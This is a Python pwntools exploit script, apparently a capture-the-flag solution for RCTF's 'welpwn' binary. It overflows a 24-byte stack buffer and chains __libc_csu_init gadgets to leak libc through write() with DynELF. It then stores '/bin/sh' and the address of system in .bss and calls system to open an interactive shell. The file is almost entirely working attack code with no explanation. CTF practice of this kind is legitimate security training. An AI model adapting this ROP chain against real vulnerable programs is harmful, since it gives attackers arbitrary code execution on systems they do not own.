#!/usr/bin/python 
# only use general gadgets
from pwn import *

p = process('welpwn')
context(arch='amd64', os='linux')

# load program
elf = ELF('welpwn')

# infomation
read_got = elf.symbols['got.read']
log.info("read_got = " + hex(read_got))

write_got = elf.symbols['got.write']
log.info("write_got = " + hex(write_got))

main = elf.symbols['main']
log.info("main = " + hex(main))

# overflow point
buflen = 24

# gadgets
mmmcall = 0x400880
ppppppr = 0x40089a
ppppr = 0x40089c

# junk code
padding = 0xdeadbeef

# need leak libc
# function 1 get system addr
# write(1, address, 8)
flag = 0
def leak(address):
    global flag
    payload = ""
    payload += "Q" * buflen
    payload += p64(ppppr)       
    payload += p64(ppppppr)
    rbx = 0
    rbp = 1
    r12 = write_got
    r13 = 8
    r14 = address
    r15 = 1
    ret = mmmcall
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
    ret = main
    payload += p64(padding) * 7 + p64(ret)
 
    p.recvuntil('RCTF\n')
    p.sendline(payload)

    if flag:
        p.recv(0x1b)
    data = p.recv(8)
    log.info("recv: " + str(data))
    flag += 1
    return data

d = DynELF(leak, elf=ELF('welpwn'))

system = d.lookup('system', 'libc')
log.info("system addr = " + hex(system))

#system = 0x7ffff7a60e10
bss = 0x601300
payload = ""
payload += "P" * buflen
payload += p64(ppppr)
payload += p64(ppppppr)
rbx = 0
rbp = 1
r12 = read_got
r13 = 17
r14 = bss
r15 = 0
ret = mmmcall
payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main
payload += p64(padding) * 7 + p64(ret)

p.recvuntil("RCTF\n")
p.sendline(payload)
sleep(1)
p.sendline("/bin/sh\0"+ p64(system))

# # function check bss 
# # write(1, bss, 16)
check = ""
check += "C" * buflen
check += p64(ppppr)
check += p64(ppppppr)
rbx = 0
rbp = 1
r12 = write_got
r13 = 16
r14 = bss
r15 = 1
ret = mmmcall
check += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main
check += p64(padding) * 7 + p64(ret)

p.recvuntil("RCTF\n")
p.sendline(check)
sleep(1)
p.recv(0x1b)
log.info("recv:" + p.recv(16).encode('hex'))

# function 3 get shell
# system(bss)
payload = ""
payload += "R" * buflen
payload += p64(ppppr)
payload += p64(ppppppr)
rbx = 0
rbp = 1
r12 = bss+0x8
r13 = bss
r14 = bss
r15 = bss
ret = mmmcall
payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main
payload += p64(padding) * 7 + p64(ret)

p.recvuntil("RCTF\n")
p.sendline(payload)

sleep(0.5)
p.recv()
p.interactive()
